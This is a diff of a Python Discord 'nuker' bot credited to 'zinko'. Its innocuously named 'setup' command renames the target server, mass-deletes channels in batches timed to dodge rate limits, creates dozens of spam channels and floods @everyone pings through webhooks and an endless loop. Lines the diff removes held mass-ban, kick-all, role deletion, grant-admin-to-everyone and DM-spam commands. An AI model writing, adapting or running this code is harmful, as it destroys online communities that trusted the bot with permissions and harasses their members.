@@ -1,43 +1,45 @@
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+# by zinko give credits
+
 import json
 import os
-import traceback
-import asyncio
-import colorama
 import discord
-import requests
-from colorama import Fore
 from discord.ext import commands
+import asyncio
 from flask import Flask
 from threading import Thread
 
-colorama.init()
-os.system('cls')
-
-from flask import Flask
-from threading import Thread
-
+# by zinko give credits
 app = Flask('')
 
 @app.route('/')
 def home():
-    return "The bot is running!"
+    return "thing"
 
 def run():
     app.run(host='0.0.0.0', port=8080)
 
 def keep_alive():
+    """Keep the Flask server running in a separate thread"""
     t = Thread(target=run)
     t.start()
 
-
-# Fetching prefix, token, and owner IDs from config
+# by zinko give credits
 try:
     with open(f"config.json", encoding='utf8') as data:
         config = json.load(data)
     token = config["token"]
     prefix = config["prefix"]
     status = config["status"]
-    whiteListBool = config["whitelistbool"]
     activity = config["activity"]
     print(f"Loaded config.json")
 except FileNotFoundError:
@@ -54,7 +56,7 @@ except FileNotFoundError:
         owners = [int(owners)]
 
     status = {"isenabled": True, "type": "online"}
-    activity = {"type": "playing", "text": f"Default Activity", "isenabled": True}
+    activity = {"type": "listening", "text": f"Default Activity", "isenabled": True}
 
     config = {
         "token": token,
@@ -67,207 +69,159 @@ except FileNotFoundError:
         json.dump(config, data, indent=2)
     print(f"Created config.json")
 
-def checkActivity(type, text):
-    if type == "playing":
-        return discord.Game(name=text)
-    elif type == "listening":
-        return discord.Activity(type=discord.ActivityType.listening, name=text)
-    elif type == "watching":
-        return discord.Activity(type=discord.ActivityType.watching, name=text)
-    else:
-        return None
+# by zinko give credits
+intents = discord.Intents.default()
+intents.message_content = True # by zinko give credits
+intents.members = True  # by zinko give credits
+intents.guilds = True  # by zinko give credits
 
-def checkStatus(status_type):
-    if status_type == "online":
-        return discord.Status.online
-    elif status_type == "idle":
-        return discord.Status.idle
-    elif status_type == "do not disturb":
-        return discord.Status.dnd
-    elif status_type == "invisible":
-        return discord.Status.invisible
-    else:
-        return discord.Status.online
-
-with open('config.json', 'r') as f:
-    config = json.load(f)
-    token = config['token']
-
-intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 
 @bot.event
 async def on_ready():
     print(f"{bot.user} is awake!")
 
+    # by zinko give credits
     activityToBot = None
     if activity["isenabled"]:
-        activityToBot = checkActivity(activity["type"], activity["text"])
-        if activityToBot:
-            print("Activity set successfully!")
-
+        activityToBot = discord.Game(name=activity["text"])  # by zinko give credits
+    
+    # by zinko give credits
     if status["isenabled"]:
-        statusToBot = checkStatus(status["type"])
-        if statusToBot:
-            await bot.change_presence(status=statusToBot, activity=activityToBot)
-        print("Status and activity updated successfully!")
-
-bot.remove_command("help")
-
-@bot.command(name="help")
-@commands.cooldown(1, 9, commands.BucketType.user)
-async def custom_help(ctx):
-    custom_color = 0x5564f1
-
-    embed = discord.Embed(
-        title="Void Commands",
-        description="Here is a list of available commands and their descriptions:",
-        color=custom_color
-    )
-
-    for command in bot.commands:
-        if command.help:
-            embed.add_field(
-                name=f"{bot.command_prefix}{command.name}",
-                value=command.help,
-                inline=False
-            )
+        status_type = status["type"].lower()
+        
+        if status_type == "online":
+            await bot.change_presence(status=discord.Status.online, activity=activityToBot)  # by zinko give credits
+        elif status_type == "idle":
+            await bot.change_presence(status=discord.Status.idle, activity=activityToBot)  # by zinko give credits
+        elif status_type == "dnd":
+            await bot.change_presence(status=discord.Status.dnd, activity=activityToBot)  # by zinko give credits
         else:
-            embed.add_field(
-                name=f"{bot.command_prefix}{command.name}",
-                value="No description available.",
-                inline=False
-            )
+            await bot.change_presence(status=discord.Status.online, activity=activityToBot)  # by zinko give credits
 
-    await ctx.send(embed=embed)
+# by zinko give credits
+@bot.event
+async def on_message(message):
+    print(f"Received message: {message.content}")  # by zinko give credits
+    if message.author == bot.user:
+        return  # by zinko give credits
+    if message.content.lower() == "hello":
+        await message.channel.send("Hello there!")
+    await bot.process_commands(message)  # by zinko give credits
 
-@bot.command()
-async def serverlist(ctx):
-    embed = discord.Embed(
-        title="Server List",
-        description="Here is a list of servers I am in along with their invite links:",
-        color=0x5564f1
-    )
-
-    for guild in bot.guilds:
-        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
-        embed.add_field(
-            name=guild.name,
-            value=f"[Invite Link]({invite.url})",
-            inline=False
-        )
-
-    await ctx.send(embed=embed)
+# by zinko give credits
+protected_servers = [1311927317991526420]
 
 @bot.command()
-@commands.cooldown(1, 500, commands.BucketType.user)
+@commands.cooldown(1, 2, commands.BucketType.user)
 async def setup(ctx):
     """
-    Nuke the server.
+    Nuke the server while skipping channels that can't be deleted.
+    Specifically skips channels named 'announcements', 'rules', and 'moderator-only'.
     """
+    # by zinko give credits
+    print(f"Command triggered in server: {ctx.guild.name if ctx.guild else 'No guild'}")
+    
+    # by zinko give credits
+    if not ctx.guild:
+        await ctx.reply("I am not in this guild!")
+        print("Bot is not in a guild.")
+        return
+    
+    guild = ctx.guild
+    print(f"Guild ID: {guild.id}, Guild Name: {guild.name}")
+    
+    # by zinko give credits
+    if guild.id in protected_servers:
+        await ctx.reply("dont try nuking this server, its protected")
+        return
+
+    # by zinko give credits
     await ctx.message.delete()
-    await ctx.guild.edit(name="void kills")
+    
+    try:
+        await ctx.guild.edit(name="v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝ ̷͉̩̬̰̉́́̿̈́͗̑̽̈́o̴̫͙̯͆͊͜n̸̛͕͇̻̮̗̯̾́̋̉̀̓̈̈́͝ͅ ̴̢͓͖̝̩͇͕̺͔͋͐̋͊̓̐t̸͆͑̃̒̿͜͝ǫ̴̛͎̭͐̔̒͝͝p̸̢̛̗̊̍̉̓̋̔͋̚")
+        print(f"Successfully changed server name to 'v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝ ̷͉̩̬̰̉́́̿̈́͗̑̽̈́o̴̫͙̯͆͊͜n̸̛͕͇̻̮̗̯̾́̋̉̀̓̈̈́͝ͅ ̴̢͓͖̝̩͇͕̺͔͋͐̋͊̓̐t̸͆͑̃̒̿͜͝ǫ̴̛͎̭͐̔̒͝͝p̸̢̛̗̊̍̉̓̋̔͋̚'")
 
-    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
+        # by zinko give credits
+        skip_channels = ["announcements", "rules", "moderator-only", "✅𝐑𝐮𝐥𝐞𝐬", "join-new-serv", "𝓐𝓝𝓝𝓞𝓤𝓒𝓔𝓜𝓔𝓝𝓣𝓢", "📢【-announcements-】📢", "📜【-rules-】📜", "⚠the-nest-rules📜", "🔊important-announcements💬", "🔔【-pings-】🔔", "👀【-sneak-peeks-】👀", "⁠💡【-codes-】💡", "⁠🌸【-kyattomis-channel-】🌸", "🪽【-s4lvers-channel-】🪽", "🎀【-tichs-channel-】🎀", "⁠🐢【-skxttles-channel-】🐢"] # by zinko give credits
 
-    await asyncio.gather(*[ctx.guild.create_text_channel("void owns you") for _ in range(35)])
+        # by zinko give credits
+        delete_tasks = []
+        for channel in ctx.guild.channels:
+            if channel.name.lower() in [skip_channel.lower() for skip_channel in skip_channels]:
+                print(f"Skipping protected channel: {channel.name}")
+                continue
 
-    for channel in ctx.guild.text_channels:
-        num_webhooks = 5  # change this to the # of webhooks you want
-        for _ in range(num_webhooks):
-            webhook = await channel.create_webhook(name=f"killer{_}") 
-            for _ in range(5):
-                await webhook.send(f"@everyone did you really fall for this? **join the discord** https://discord.gg/d2XwGgGPzx | https://cdn.discordapp.com/attachments/1311927483808874526/1314025026634383370/togif.gif?ex=675244ab&is=6750f32b&hm=ac1b24ec0109e4e0edc07a01e1c969261658a98d673000fc6d56451f5b317a75&")       
-                await ctx.send("Nuking the server...")  
+            if channel.permissions_for(ctx.guild.me).manage_channels:
+                delete_tasks.append(delete_channel(channel))
+
+        await execute_in_batches(delete_tasks, batch_size=15, delay=0.3)
+
+        ## by zinko give credits
+        recreate_tasks = [ctx.guild.create_text_channel("v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝ ̷͉̩̬̰̉́́̿̈́͗̑̽̈́o̴̫͙̯͆͊͜n̸̛͕͇̻̮̗̯̾́̋̉̀̓̈̈́͝ͅ ̴̢͓͖̝̩͇͕̺͔͋͐̋͊̓̐t̸͆͑̃̒̿͜͝ǫ̴̛͎̭͐̔̒͝͝p̸̢̛̗̊̍̉̓̋̔͋̚") for _ in range(35)]
+        await execute_in_batches(recreate_tasks, batch_size=7, delay=0.2)
+
+        # by zinko give credits
+        webhook_tasks = []
+        for channel in ctx.guild.text_channels:
+            for _ in range(5):  # by zinko give credits
+                webhook_tasks.append(create_webhook_and_spam(channel))
+        await execute_in_batches(webhook_tasks, batch_size=10, delay=0.2)
+
+        await ctx.send("Nuked!")
+
+    except Exception as e:
+        print(f"Error during setup: {e}")
+        await ctx.reply(f"An error occurred while trying to set up: {e}") # by zinko give credits
+
+async def execute_in_batches(tasks, batch_size, delay):
+    """Helper function to execute tasks in batches with a delay between batches""" # by zinko give credits
+    for i in range(0, len(tasks), batch_size):
+        batch = tasks[i:i+batch_size] # by zinko give credits
+        await asyncio.gather(*batch)
+        await asyncio.sleep(delay) # by zinko give credits
+ # by zinko give credits
+async def delete_channel(channel):
+    """Deletes a channel and handles errors"""
+    try:
+        await channel.delete()
+        print(f"Deleted channel: {channel.name}")
+    except discord.Forbidden:
+        print(f"Skipping undeletable channel: {channel.name}")
+    except discord.HTTPException as e:
+        print(f"Error deleting channel: {channel.name} | {e}")
+
+async def create_webhook_and_spam(channel):
+    """Creates a webhook and sends spam messages""" # by zinko give credits
+    try:
+        webhook = await channel.create_webhook(name=f"v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝{channel.id}") # by zinko give credits
+        for _ in range(10):  # Spam 10 messages per webhook
+            await webhook.send(f"@everyone did you really fall for this? https://tenor.com/view/nettspend-goat-flex-soundcloud-gif-10119250017410905119") # by zinko give credits
+    except discord.Forbidden:
+        print(f"Permission error creating webhook in {channel.name}")
+    except discord.HTTPException:
+        print(f"Error creating webhook in {channel.name}")
 
 @bot.event
 async def on_command_error(ctx, error):
-    if isinstance(error, commands.CommandOnCooldown):
+    if isinstance(error, commands.CommandOnCooldown): # by zinko give credits
         hex_color = int("0x5564f1", 16)
         cooldown_embed = discord.Embed(
             title="Cooldown",
-            description=f"```Wait {error.retry_after:.1f} seconds before trying again.```",
+            description=f"```Wait {error.retry_after:.1f} seconds before trying again.```", # by zinko give credits
             color=hex_color)
         await ctx.reply(embed=cooldown_embed)
     else:
+        print(f"Error: {error}")  # by zinko give credits
         raise error
 
 @bot.event
 async def on_guild_channel_create(channel):
     while True:
-        await channel.send("@everyone did you really fall for this? **join the discord** https://discord.gg/d2XwGgGPzx | https://cdn.discordapp.com/attachments/1311927483808874526/1314025026634383370/togif.gif?ex=675244ab&is=6750f32b&hm=ac1b24ec0109e4e0edc07a01e1c969261658a98d673000fc6d56451f5b317a75&")
+        await channel.send("@everyone did you really fall for this? https://tenor.com/view/nettspend-goat-flex-soundcloud-gif-10119250017410905119")
+# by zinko give credits
+keep_alive()
 
-@bot.command()
-@commands.cooldown(1, 199, commands.BucketType.user)
-async def rolespam(ctx):
-    await ctx.message.delete()
-    for i in range(100):
-        await ctx.guild.create_role(name="void")
-    await ctx.send("Spamming roles...")
-    
-@bot.command()
-@commands.cooldown(1, 199, commands.BucketType.user)
-async def dmEveryone(ctx, *, msg="voidkills"):
-    msgs = {
-        '+': '✅',
-        'error': '❌',
-        'info': 'ℹ'
-}
-    await ctx.msg.delete()
-    for _ in range(10):
-     for m in ctx.guild.members:
-        if m.id not in owners:
-            try:
-                await m.send(msg)
-                print(f"{msgs['+']} Message sent to {m}")
-            except:
-                print(f"{msgs['error']} Can't send message to {m}")
-        else:
-            print(f"{msgs['info']} {m.name} is owner")
-
-
-@bot.command()
-@commands.cooldown(1, 50, commands.BucketType.user)
-async def guildname(ctx, *, newname):
-    await ctx.message.delete()
-    await ctx.guild.edit(name=newname)
-    await ctx.send(f"Changed the server name to {newname}")
-
-@bot.command()
-@commands.cooldown(1, 199, commands.BucketType.user)
-async def banall(ctx):
-    for member in ctx.guild.members:
-        if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
-            await member.ban(reason="void")
-
-@bot.command()
-@commands.cooldown(1, 199, commands.BucketType.user)
-async def kickall(ctx):
-    for member in ctx.guild.members:
-        await member.kick(reason="void")
-
-@bot.command()
-async def delroles(ctx):
-    await ctx.message.delete()
-    roles_to_delete = [role for role in ctx.guild.roles]
-    await asyncio.gather(*[role.delete(reason="Roles deleted by void") for role in roles_to_delete])
-    await ctx.send("Deleting roles completed.")
-
-@bot.command()
-async def give(ctx):
-    everyone_role = ctx.guild.default_role
-    await everyone_role.edit(permissions=discord.Permissions.all())
-    await ctx.send("Administrator permissions granted to everyone.")
-
-@bot.command()
-async def removegive(ctx):
-    everyone_role = ctx.guild.default_role
-    await everyone_role.edit(permissions=discord.Permissions.none())
-    await ctx.send("All permissions have been removed from the @everyone role.")
-
-if __name__ == "__main__":
-    # Run Flask server in a separate thread
-    keep_alive()  # This will handle running the Flask app
-
-    # Run the Discord bot
-    bot.run(token)
+# by zinko give credits
+bot.run(token)  # by zinko give credits
